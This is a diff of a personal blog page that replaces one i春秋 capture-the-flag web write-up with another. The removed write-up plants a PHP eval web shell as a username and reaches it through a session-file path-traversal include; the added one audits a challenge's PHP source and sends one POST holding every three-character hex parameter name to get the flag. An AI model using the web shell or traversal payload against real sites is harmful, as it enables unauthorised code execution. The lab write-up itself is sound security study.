@@ -5,13 +5,15 @@
     <meta charset="UTF-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
     <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>i春秋:Web-Notebook - H3ng</title>
+    <title>i春秋:Web-攻击 - H3ng</title>
     <meta name="apple-mobile-web-app-capable" content="yes" />
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="google" content="notranslate" />
     <meta name="keywords" content="H3ng,"> 
-    <meta name="description" content="tips： 文件包含phpinfo是不是有新的发现
-打开f12获取到PHPSESSION为ei4obnmvtlkbt57muuj4kh6f92，但为文件时则为ei4obnmvtlkbt57muuj4,"> 
+    <meta name="description" content=" &amp;lt;?php
+header(&#34;content-type:text/html;charset=utf-8&#34;);
+show_source(__FILE__);
+echo &#39;&amp;lt;pre&amp;gt;&#39;,"> 
     <meta name="author" content="H3ng"> 
     <link rel="alternative" href="atom.xml" title="H3ng" type="application/atom+xml"> 
     <link rel="icon" href="/img/favicon.png"> 
@@ -31,7 +33,7 @@
     <div class="bar" style="width: 0;"></div>
     <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://LXH3ng.github.io"></a>
     <div title="播放/暂停" class="iconfont icon-play"></div>
-    <h3 class="subtitle">i春秋:Web-Notebook</h3>
+    <h3 class="subtitle">i春秋:Web-攻击</h3>
     <div class="social">
         <div>
             <div class="share">
@@ -46,29 +48,50 @@
     <div class="section">
         <div class="article">
     <div class='main'>
-        <h1 class="title">i春秋:Web-Notebook</h1>
+        <h1 class="title">i春秋:Web-攻击</h1>
         <div class="stuff">
-            <span>六月 03, 2021</span>
+            <span>六月 04, 2021</span>
             
   <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/i%E6%98%A5%E7%A7%8B/" rel="tag">i春秋</a></li></ul>
 
 
         </div>
         <div class="content markdown">
-            <p>tips： 文件包含phpinfo是不是有新的发现</p>
-<p>打开f12获取到PHPSESSION为ei4obnmvtlkbt57muuj4kh6f92，但为文件时则为ei4obnmvtlkbt57muuj4kh6f92。</p>
-<p><img src="/2021/06/03/i-chun-qiu-web-notebook/image-20210603195929708.png" alt="image-20210603195929708"></p>
-<p>创建用户</p>
-<pre><code>&lt;?php @eval($_POST[cmd]);?&gt;</code></pre>
-<p>登录</p>
-<p>访问：</p>
-<pre><code>http://8232dd75fdf94633b62235ec0315dc5e619bd981bd404025.changame.ichunqiu.com/action.php?module=&amp;file=../../../tmp/SESS/sess_ei4obnmvtlkbt57muuj4kh6f92</code></pre>
-<p>采用hackbar更改post数据</p>
-<p>cmd之后的命令会被执行</p>
-<p><img src="/2021/06/03/i-chun-qiu-web-notebook/image-20210603195017909.png" alt="image-20210603195017909"></p>
-<p><img src="/2021/06/03/i-chun-qiu-web-notebook/image-20210603194950513.png" alt="image-20210603194950513"></p>
-<p>查看f12</p>
-<p><img src="/2021/06/03/i-chun-qiu-web-notebook/image-20210603195255484.png" alt="image-20210603195255484"></p>
+            <pre><code> &lt;?php
+header("content-type:text/html;charset=utf-8");
+show_source(__FILE__);
+echo '&lt;pre&gt;';
+include('u/ip.php');
+include('flag.php');
+if (in_array($_SERVER['REMOTE_ADDR'],$ip)){
+  die("您的ip已进入系统黑名单");
+}
+var_dump($ip);
+
+if ($_POST[substr($flag,5,3)]=='attack'){
+  echo $flag;
+}else if (count($_POST)&gt;0){
+  $ip = '$ip[]="'.$_SERVER['REMOTE_ADDR'].'";'.PHP_EOL; 
+  file_put_contents('u/ip.php',$ip,FILE_APPEND);
+}
+
+
+echo '&lt;/pre&gt;';
+
+array(0) {
+}</code></pre>
+<p>经过审计，要求你post传入的参数内容是attack，名字必须和flag从第五位开始往后三位一样才行。而且会检测REMOTE_ADDR，这个东西是没法伪造的，每个人只有一次机会。</p>
+<pre><code>import requests
+a = "1234567890abcdef"
+data = {}
+for i in a:
+    for j in a:
+        for k in a:
+            data[i+j+k]="attack"
+print(data)
+url='http://f5cbfc1ababd4d9bb04abd665fbeeada3d10cb45b099418f.changame.ichunqiu.com/'
+r=requests.post(url,data=data)
+print(r.text)</code></pre>
 
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
